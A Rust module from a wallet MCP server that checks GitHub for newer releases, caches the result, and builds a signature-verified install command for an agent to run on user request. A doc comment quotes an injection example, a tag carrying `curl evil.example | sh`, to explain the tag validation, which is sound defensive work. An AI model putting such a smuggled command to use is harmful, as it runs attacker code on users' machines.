//! Whether a newer release exists, and the command that installs it.
//!
//! This never installs anything. A binary that replaces itself has to write
//! over the file it is executing, and the process that does that is the one
//! process guaranteed to be running at the time — so the replacement is done
//! by `install.sh`, which runs when the wallet does not. What lives here is
//! only the question "am I behind?", asked in two places: as a footer on the
//! `version` and `status` commands, and as [`crate::mcp`]'s
//! `wallet_check_for_updates` tool.
//!
//! The answer carries a shell command an agent is expected to run, so the tag
//! it interpolates is validated rather than trusted: see [`valid_tag`]. Every
//! failure here — offline, rate limited, malformed JSON, an unwritable cache —
//! resolves to "no update known" rather than an error, because nothing that
//! depends on this answer should fail when the answer is merely unavailable.

use chrono::{DateTime, Utc};
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::time::Duration;

/// The repository releases are published from, matching `install.sh`.
const DEFAULT_REPOSITORY: &str = "EkuboProtocol/wallet-mcp-server";

/// Set to `1` to make every check here a no-op.
const SKIP_ENVIRONMENT_VARIABLE: &str = "EKUBO_WALLET_SKIP_UPDATE_CHECK";

/// Overrides the repository, under the same name `install.sh` reads.
const REPOSITORY_ENVIRONMENT_VARIABLE: &str = "EKUBO_WALLET_REPOSITORY";

const CACHE_FILE: &str = "release-check.json";

/// A day. Releases are not frequent enough for a shorter window to tell anyone
/// anything, and GitHub's unauthenticated limit is 60 requests an hour per
/// address — which this stays far below even with both surfaces asking.
const CACHE_TTL_SECONDS: i64 = 24 * 60 * 60;

/// Short enough that a hung endpoint cannot delay a CLI command or a tool call
/// by anything a person would notice.
const REQUEST_TIMEOUT: Duration = Duration::from_secs(2);

/// The release JSON is a few kilobytes. Anything past this is not that.
const MAX_RESPONSE_BYTES: u64 = 1 << 20;

/// Where the answer came from, so a caller can tell "you are current" apart
/// from "nobody could say".
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum CheckSource {
    /// Asked the release endpoint just now.
    Network,
    /// Reused an answer from within the last day.
    Cache,
    /// Turned off by the environment.
    Disabled,
    /// Nothing answered, and no cached answer was usable.
    Unavailable,
}

/// The complete answer, shaped so both the CLI footer and the MCP tool read
/// the same fields.
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct ReleaseCheck {
    /// The running build, exactly as `ekubo-wallet version` prints it.
    pub installed_version: String,
    /// The newest published release, when one could be determined.
    pub latest_version: Option<String>,
    /// True only when both versions parsed and the published one is newer.
    /// An unknown answer is never reported as an update.
    pub update_available: bool,
    /// The release page for `latest_version`.
    pub release_url: Option<String>,
    /// The exact command that installs `latest_version`, pinned to its tag.
    /// Present only when an update is actually available.
    pub upgrade_command: Option<String>,
    /// When `latest_version` was learned — now, or when the cache was written.
    pub checked_at: Option<DateTime<Utc>>,
    pub source: CheckSource,
    /// What the caller should do about it, in words, because the caller is
    /// usually a model.
    pub instruction: String,
}

impl ReleaseCheck {
    /// The answer when there is nothing to say, which is also the answer to
    /// every failure.
    fn unknown(installed_version: &str, source: CheckSource) -> Self {
        Self {
            installed_version: installed_version.to_string(),
            latest_version: None,
            update_available: false,
            release_url: None,
            upgrade_command: None,
            checked_at: None,
            source,
            instruction: "The latest published release could not be determined, so nothing \
is known about whether this build is current. This is not an error and nothing is wrong with \
the wallet. Do not retry, and do not tell the user to upgrade."
                .to_string(),
        }
    }

    /// The one-line footer the CLI prints, or nothing when there is no news.
    #[must_use]
    pub fn notice(&self) -> Option<String> {
        let (latest, command) = (
            self.latest_version.as_ref()?,
            self.upgrade_command.as_ref()?,
        );
        if !self.update_available {
            return None;
        }
        Some(format!(
            "ekubo-wallet {latest} is available; you are running {}.\n  {command}",
            self.installed_version
        ))
    }
}

/// A release tag, as it may be spliced into a URL and a shell command.
///
/// The command an agent may be asked to run to install a newer release.
///
/// It used to be `curl … /install.sh | sh`. `install.sh` verifies everything it
/// downloads — the archive against `SHA256SUMS`, `SHA256SUMS` against a keyless
/// Sigstore bundle, refusing rather than downgrading when either is missing —
/// but nothing verified `install.sh`. It was fetched from the raw source tree
/// at a tag, and a shell begins executing a piped script as it arrives, so
/// every check inside it ran only if whoever chose those bytes wanted it to.
/// Verifying the payload with a script the same party could replace proves
/// nothing, and the release workflow signed the archives it names but not the
/// script itself.
///
/// So the installer is now a signed release asset and this downloads it, checks
/// its bundle against the release workflow's identity at this exact tag, and
/// runs it only if `cosign` says the bytes are the ones that workflow produced.
/// No `cosign`, no install: that is the same refusal `install.sh` already makes
/// about its own downloads, applied one step earlier to itself.
///
/// `&&` throughout rather than `;`, so a failed download or a failed
/// verification stops the sequence instead of falling through to `sh`. The tag
/// and repository are interpolated into a shell command and are validated by
/// [`valid_tag`] and [`valid_repository`] before reaching here.
fn upgrade_command(repository: &str, tag: &str) -> String {
    let asset = format!("https://github.com/{repository}/releases/download/{tag}");
    let identity =
        format!("https://github.com/{repository}/.github/workflows/release.yml@refs/tags/{tag}");
    format!(
        "d=$(mktemp -d) && \
curl -fsSL -o \"$d/install.sh\" {asset}/install.sh && \
curl -fsSL -o \"$d/install.sh.sigstore.json\" {asset}/install.sh.sigstore.json && \
cosign verify-blob --bundle \"$d/install.sh.sigstore.json\" \
--certificate-identity {identity} \
--certificate-oidc-issuer https://token.actions.githubusercontent.com \
\"$d/install.sh\" && \
sh \"$d/install.sh\""
    )
}

/// The tag arrives over the network and leaves in `upgrade_command`, which an
/// agent is told it may run. Nothing downstream re-checks it, so a tag of
/// `v1.0.0; curl evil.example | sh` would be a shell injection with a network
/// operator holding the trigger. Real tags are `v` and a semantic version, so
/// that is the whole of what is accepted: anything else is treated as no
/// answer at all.
fn valid_tag(tag: &str) -> bool {
    !tag.is_empty()
        && tag.len() <= 64
        && tag
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'+'))
}

/// A repository, as `owner/name`. Read from the environment rather than the
/// network, but it reaches the same URL and the same command string.
fn valid_repository(repository: &str) -> bool {
    let mut parts = repository.split('/');
    let (Some(owner), Some(name), None) = (parts.next(), parts.next(), parts.next()) else {
        return false;
    };
    let segment = |segment: &str| {
        !segment.is_empty()
            && segment.len() <= 100
            && segment
                .bytes()
                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
    };
    segment(owner) && segment(name)
}

fn repository() -> String {
    std::env::var(REPOSITORY_ENVIRONMENT_VARIABLE)
        .ok()
        .filter(|repository| valid_repository(repository))
        .unwrap_or_else(|| DEFAULT_REPOSITORY.to_string())
}

fn skip_requested() -> bool {
    std::env::var(SKIP_ENVIRONMENT_VARIABLE).is_ok_and(|value| value == "1")
}

/// A version split into the parts that order it.
struct Version {
    /// The dot-separated numeric core, `1.4.2`.
    core: Vec<u64>,
    /// Whether a `-rc.1`-style prerelease suffix followed it.
    prerelease: bool,
}

fn parse_version(text: &str) -> Option<Version> {
    // `BUILD_VERSION` is `1.0.0-rc.0+8133a00` on an untagged build, and tags
    // carry a leading `v`; both reduce to the same core.
    let text = text.trim().strip_prefix('v').unwrap_or(text.trim());
    let without_build = text.split('+').next()?;
    let (core_text, prerelease) = match without_build.split_once('-') {
        Some((core, _)) => (core, true),
        None => (without_build, false),
    };
    let core = core_text
        .split('.')
        .map(|component| component.parse::<u64>().ok())
        .collect::<Option<Vec<u64>>>()?;
    (!core.is_empty()).then_some(Version { core, prerelease })
}

/// Whether `latest` supersedes `installed`, or `None` when either is not a
/// version this understands. `None` is deliberately not `false`: the caller
/// reports nothing rather than guessing in either direction.
fn is_newer(installed: &str, latest: &str) -> Option<bool> {
    let installed = parse_version(installed)?;
    let latest = parse_version(latest)?;
    let length = installed.core.len().max(latest.core.len());
    for index in 0..length {
        let running = installed.core.get(index).copied().unwrap_or(0);
        let published = latest.core.get(index).copied().unwrap_or(0);
        if published != running {
            return Some(published > running);
        }
    }
    // Same numeric core. A release supersedes a prerelease of itself, which is
    // the case that matters while `BUILD_VERSION` is an `-rc` build.
    Some(installed.prerelease && !latest.prerelease)
}

#[derive(Serialize, Deserialize)]
struct Cache {
    /// Which repository the tag was read from. A tag only means something
    /// alongside the repository that published it: without this, pointing
    /// `EKUBO_WALLET_REPOSITORY` somewhere else would keep answering with the
    /// previous repository's tag for a day, and build a release URL and an
    /// install command naming a tag the new repository does not have.
    repository: String,
    latest_version: String,
    checked_at: DateTime<Utc>,
}

fn read_cache(data_dir: &Path, repository: &str) -> Option<Cache> {
    let text = std::fs::read_to_string(data_dir.join(CACHE_FILE)).ok()?;
    let cache: Cache = serde_json::from_str(&text).ok()?;
    (cache.repository == repository && valid_tag(&cache.latest_version)).then_some(cache)
}

/// Best effort in both directions: a cache that cannot be written costs a
/// request next time and nothing else, so no failure here reaches the caller.
fn write_cache(data_dir: &Path, cache: &Cache) {
    let Ok(text) = serde_json::to_string(cache) else {
        return;
    };
    // Written beside the target and renamed, so a concurrent reader sees one
    // whole file or the previous one, never a half-written mix.
    let temporary = data_dir.join(format!("{CACHE_FILE}.tmp"));
    if std::fs::create_dir_all(data_dir).is_err() {
        return;
    }
    if std::fs::write(&temporary, text).is_err() {
        return;
    }
    if std::fs::rename(&temporary, data_dir.join(CACHE_FILE)).is_err() {
        let _ = std::fs::remove_file(&temporary);
    }
}

/// Read a response body, stopping at `MAX_RESPONSE_BYTES`.
///
/// The `content_length` check above is a courtesy the server extends. It can
/// omit the header entirely -- chunked encoding does -- or state one length
/// and send another, and `text()` then buffers whatever arrives. So the header
/// is worth checking because it refuses the honest oversized case before a
/// single byte is read, and it is not worth trusting.
///
/// Accumulated chunk by chunk and abandoned the moment it passes the ceiling,
/// so the memory this costs is bounded by the ceiling rather than by what the
/// far end decided to send. `None` rather than a truncated body: a partial
/// JSON document is not a release, and the whole call is already best-effort.
async fn bounded_body(mut response: reqwest::Response) -> Option<String> {
    let mut body = Vec::new();
    while let Ok(Some(chunk)) = response.chunk().await {
        if body.len() + chunk.len() > MAX_RESPONSE_BYTES as usize {
            return None;
        }
        body.extend_from_slice(&chunk);
    }
    String::from_utf8(body).ok()
}

async fn fetch_latest_tag(repository: String) -> Option<String> {
    let client = reqwest::Client::builder()
        .connect_timeout(REQUEST_TIMEOUT)
        .timeout(REQUEST_TIMEOUT)
        .user_agent(format!("ekubo-wallet/{}", crate::BUILD_VERSION))
        .build()
        .ok()?;
    let response = client
        .get(format!(
            "https://api.github.com/repos/{repository}/releases/latest"
        ))
        .header("Accept", "application/vnd.github+json")
        .send()
        .await
        .ok()?;
    if !response.status().is_success() {
        return None;
    }
    if response
        .content_length()
        .is_some_and(|length| length > MAX_RESPONSE_BYTES)
    {
        return None;
    }
    let body = bounded_body(response).await?;
    let value: serde_json::Value = serde_json::from_str(&body).ok()?;
    let tag = value.get("tag_name")?.as_str()?.trim().to_string();
    valid_tag(&tag).then_some(tag)
}

/// The check, with the network call and the clock supplied by the caller so
/// the whole of the logic is reachable from a test without either.
async fn check_with<F, Fut>(
    data_dir: &Path,
    installed_version: &str,
    repository: &str,
    now: DateTime<Utc>,
    disabled: bool,
    fetch: F,
) -> ReleaseCheck
where
    F: FnOnce() -> Fut,
    Fut: std::future::Future<Output = Option<String>>,
{
    if disabled {
        return ReleaseCheck::unknown(installed_version, CheckSource::Disabled);
    }

    let cached = read_cache(data_dir, repository);
    // A half-open range rather than a `<`, so a cache dated in the future —
    // a clock that moved backwards, a file copied between machines — is stale
    // rather than fresh forever.
    let fresh = cached.as_ref().filter(|cache| {
        (0..CACHE_TTL_SECONDS).contains(&now.signed_duration_since(cache.checked_at).num_seconds())
    });

    let (tag, checked_at, source) = match fresh {
        Some(cache) => (
            cache.latest_version.clone(),
            cache.checked_at,
            CheckSource::Cache,
        ),
        // Validated here rather than only in the fetch, so the guard sits
        // where the tag is used: everything downstream — the cache it is
        // written to, the URL, the shell command — trusts this point and
        // nothing re-checks. Rejecting one is the same as being offline.
        None => match fetch().await.filter(|tag| valid_tag(tag)) {
            Some(tag) => {
                write_cache(
                    data_dir,
                    &Cache {
                        repository: repository.to_string(),
                        latest_version: tag.clone(),
                        checked_at: now,
                    },
                );
                (tag, now, CheckSource::Network)
            }
            // Offline with a stale answer is still a better answer than none:
            // the version it names was published, and the only thing its age
            // can cause is under-reporting a newer one.
            None => match cached {
                Some(cache) => (cache.latest_version, cache.checked_at, CheckSource::Cache),
                None => {
                    return ReleaseCheck::unknown(installed_version, CheckSource::Unavailable);
                }
            },
        },
    };

    let Some(update_available) = is_newer(installed_version, &tag) else {
        return ReleaseCheck::unknown(installed_version, source);
    };

    let release_url = format!("https://github.com/{repository}/releases/tag/{tag}");
    let instruction = if update_available {
        "A newer release is published. Tell the user, and run upgrade_command only if they \
ask you to. That command installs over the binary this server is running from; the running \
process keeps the version it started with, so after it succeeds tell the user to restart the \
wallet MCP server — in Claude Code, /mcp then reconnect ekubo-wallet — for the new version to \
take effect. This wallet cannot update itself and has no tool that does. The command verifies the installer's Sigstore signature before running it and stops if that fails; do not edit it to skip the verification, and do not substitute a shorter one-liner that pipes the script straight into a shell."
            .to_string()
    } else {
        "This build is the latest published release. Say so if asked; there is nothing to do."
            .to_string()
    };

    ReleaseCheck {
        installed_version: installed_version.to_string(),
        latest_version: Some(tag.clone()),
        update_available,
        release_url: Some(release_url),
        upgrade_command: update_available.then(|| upgrade_command(repository, &tag)),
        checked_at: Some(checked_at),
        source,
        instruction,
    }
}

/// Ask whether a newer release exists, reusing a cached answer for a day.
pub async fn check(data_dir: &Path) -> ReleaseCheck {
    let repository = repository();
    check_with(
        data_dir,
        crate::BUILD_VERSION,
        &repository,
        Utc::now(),
        skip_requested(),
        || fetch_latest_tag(repository.clone()),
    )
    .await
}

/// Print the footer, if there is one, to stderr.
///
/// Stderr because stdout is what `--json` writes and what a caller pipes; a
/// version notice has no business in either.
pub async fn print_notice(data_dir: &Path) {
    if let Some(notice) = check(data_dir).await.notice() {
        eprintln!("\n{notice}");
    }
}

#[cfg(test)]
#[path = "release_check_test.rs"]
mod tests;
